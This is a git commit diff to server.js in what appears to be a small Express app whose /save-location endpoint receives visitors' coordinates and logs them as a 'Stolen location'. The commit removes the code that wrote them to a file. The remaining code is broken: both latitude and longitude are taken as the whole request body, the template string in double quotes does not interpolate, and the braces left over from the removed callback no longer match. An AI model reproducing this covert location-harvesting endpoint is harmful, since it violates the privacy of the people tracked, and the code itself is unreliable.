6c957ca622c95ee4bead9479366bdda33b2b8026
jeman618 <jcisne23@calpoly.edu>
2025-05-14 22:04:10 -0700

    fix?

--- server.js
+++ server.js
@@ -11,17 +11,9 @@ app.post("/save-location", (req, res) => {
   const latitude = req.body;
   const longitude = req.body;
 
-  const data = `Latitude: ${latitude}\nLongitude: ${longitude}\n`;
-
-  fs.appendFile(FILE_PATH, data, (err) => {
-    if (err) {
-      console.error("Error writing file:", err);
-      return res.status(500).send("Error saving location.");
-    }
-
     console.log("Stolen location: Latitude: ${latitude}, Longitude: ${longitude}");
     res.send("Location saved successfully.");
-  });
+
 });
 
 app.listen(PORT, () => {
